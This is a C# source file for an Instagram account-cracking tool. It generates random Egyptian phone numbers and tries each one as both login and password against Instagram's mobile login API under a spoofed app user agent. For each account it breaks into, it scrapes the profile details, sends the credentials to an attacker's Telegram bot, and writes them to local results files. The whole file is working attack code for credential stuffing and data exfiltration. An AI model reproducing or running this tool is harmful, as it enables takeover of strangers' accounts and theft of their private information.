using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using Leaf.xNet;
using Console = Colorful.Console;
using System.IO;
using System.Net;
using System.Web;
using System.Threading;

namespace Insta
{
    class User
    {
        public string username { get; set; }
        public string phone { get; set; }
        public string password { get; set; }
        public string created { get; set; }
        public string Name { get; set; }
        public string followers { get; set; }
        public string following { get; set; }
        public bool is_private { get; set; }
        public string id { get; set; }
        public string bio { get; set; }
        public  User(string username , string phone , string password)
        {
            this.username = username;
            this.phone = phone;
            this.password = password;
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                string  response = req.Get("https://www.instagram.com/" + this.username + "/?__a=1").ToString();
                JObject job = JObject.Parse(response);
                this.Name = job["graphql"]["user"]["full_name"].ToString();
                this.followers = job["graphql"]["user"]["edge_followed_by"]["count"].ToString();
                this.following = job["graphql"]["user"]["edge_follow"]["count"].ToString();
                this.is_private = (bool)job["graphql"]["user"]["is_private"];
                this.bio = job["graphql"]["user"]["biography"].ToString();
                this.id = job["graphql"]["user"]["id"].ToString();
                response = req.Get("https://o7aa.pythonanywhere.com/?id=" + this.id).ToString();
                job = JObject.Parse(response);
                this.created = job["data"].ToString();
            }
        }
    }
    class Program
    {
        static int GOOD     = 0;
        static int BAD      = 0;
        static int GUARD    = 0;
        static int ManyRequests = 0;
        static string token = "";
        static string chat = "";
        static string ProxyType = "";
        static List<string> Proxies = new List<string>();
        static void Main(string[] args)
        {
            
            if (!File.Exists("results.txt"))
            {
                File.Create("results.txt");
            }
            Console.Title = "@Tarook";
            ProxyType = "none";
            Console.Write("[>] Operator Code (010,012,011,015) :  ");
            string Operator = Console.ReadLine();
            if (!File.Exists("telegram.txt"))
            {
                Console.Write("[>] Bot token :  ");
                token = Console.ReadLine();
                Console.Write("[>] Chat id :  ");
                chat = Console.ReadLine();
                using (StreamWriter sw = new StreamWriter("telegram.txt"))
                {
                    sw.WriteLine(token+";"+chat);
                }
            }
            else
            {
                string cred = File.ReadLines("telegram.txt").First();
                token = cred.Split(';')[0];
                chat = cred.Split(';')[1];

            }


            if (Operator == "010")
            {
                Operator = "0109";
            }
            else if (Operator == "011")
            {
                Operator = "0112";
            }
            else
            {
                Operator = "0128";
            }
            Console.WriteLine("App Started...");
            for (int i = 0; i< int.MaxValue; i++)
            { 
                
                string number = Operator + RandomDigits(7);
                Check("2" + number, number);
                Console.Title = $"@Tarook GOOD : {GOOD} | 2FA  : {GUARD} | BAD : {BAD} |  Errors : {ManyRequests}  ";
                Thread.Sleep(500);
            };
            /*
            for (int i = 0;i< int.MaxValue; i++)
            {
                string number = Operator + RandomDigits(7);
                Check("2" + number, number);
                Console.Title = $"@Tarook GOOD : {GOOD} | 2FA  : {GUARD} | BAD : {BAD} |  Errors : {ManyRequests}  ";
            }
            Console.ReadLine();*/


        }
        public static void SaveResult(User user)
        {
            using (StreamWriter sw = new StreamWriter("results.txt",true))
            {
                sw.WriteLine("Followers " + user.followers + "  | @" + user.username + " | phone : " +user.phone + " | password : " +user.phone);
                sw.Close();
            }
            using (StreamWriter sw = new StreamWriter("pure.txt", true))
            {
                sw.WriteLine(ٍuser.password);
                sw.Close();
            }
            using (StreamWriter sw = new StreamWriter("followers.txt",true))
            {
                sw.WriteLine(user.followers + ";" + user.phone + ":"+user.password);
            }
        }
        public static string RandomDigits(int length)
        {
            var random = new Random();
            string s = string.Empty;
            for (int i = 0; i < length; i++)
                s = String.Concat(s, random.Next(10).ToString());
            return s;
        }
        public static void Check(string phone, string password)
        {
            try
            {
                var url = "https://i.instagram.com/api/v1/accounts/login/";
                string uid = System.Guid.NewGuid().ToString();
                using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
                {
                    req.AddHeader("X-IG-Capabilities", "3brTvw==");
                    req.AddHeader("X-IG-Connection-Type", "WIFI");
                    req.AllowAutoRedirect = true;
                    req.IgnoreProtocolErrors = true;/*
                    if (ProxyType.ToLower() == "socks4")
                    {
                        req.Proxy = Socks4ProxyClient.Parse(proxy);

                    }
                    else if (ProxyType.ToLower() == "socks5")
                    {
                        req.Proxy = Socks5ProxyClient.Parse(proxy);

                    }
                    else if (ProxyType.ToLower() == "http")
                    {
                        req.Proxy = HttpProxyClient.Parse(proxy);

                    }
                    else if (ProxyType.ToLower() == "none")
                    {
                        
                    }
                    else
                    {
                        Console.WriteLine($"[Invaild proxy type] ", System.Drawing.Color.Red);

                    }*/
                    req.UserAgent = "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)";
                    var Parms = new RequestParams();
                    Parms["uuid"] = uid;
                    Parms["username"] = phone;
                    Parms["password"] = password;
                    Parms["device_id"] = uid;
                    Parms["from_reg"] = false;
                    Parms["_csrftoken"] = "missing";
                    Parms["login_attempt_countn"] = "0";
                    var res = req.Post(url, Parms);
                    if (res.ToString().Contains("logged_in_user"))
                    {
                        JObject ob = JObject.Parse(res.ToString());
                        string username = (string)ob["logged_in_user"]["username"];
                        GOOD++;
                        User txb = new User(username, phone, password);
                        Console.WriteLine($"[GOOD] {username} |  Followers : {txb.followers}", System.Drawing.Color.Green);
                        SendTelegram(txb);
                        SaveResult(txb);
                    }
                    else if (res.ToString().Contains("challenge_required"))
                    {
                        GUARD++;
                        Console.WriteLine($"[2Fa] {phone} ", System.Drawing.Color.Yellow);

                    }
                    else if (res.StatusCode == Leaf.xNet.HttpStatusCode.TooManyRequests)
                    {
                        ManyRequests++;
                        Console.WriteLine("Error : " + res.StatusCode,System.Drawing.Color.Aqua );
                        Thread.Sleep(5000);
                    }
                    else
                    {
                        BAD++;
                        Console.WriteLine($"[BAD] {phone} ", System.Drawing.Color.Red);

                    }
                }
            }

            catch (Exception err)
            {
                ManyRequests++;
                Console.WriteLine(err.ToString());
                Console.WriteLine($"[Error] {phone} ", System.Drawing.Color.Red);

            }


        }
        public static void SendTelegram(User user)
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                string message = $@"
= = = = = = = = = = = = = = = = = =
 Combo : {user.phone}:{user.password}
 Name : {user.Name}
 Username  : {user.username}
 Phone : {user.phone}
 Password : {user.password}
 ID : {user.id}
 Followers : {user.followers}
 Following : {user.following}
 Creation date : {user.created}
 User bio : {user.bio}
 Number of hits : {GOOD}
= = = = = = = = = = = = = = = = = =
";
                req.Get("https://api.telegram.org/bot" + token  + "/sendMessage?chat_id=" + chat + "&text=" +  HttpUtility.UrlEncode(message));
            }
        }
        public static string getFollowers(string username)
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
              var res = req.Get("https://instagram.com/" + username);
              string followers = res.ToString().Split(new string[] { "userInteractionCount\":\"" }, StringSplitOptions.None)[1].Split('"')[0];
              return followers;
            }

        }
    }
}
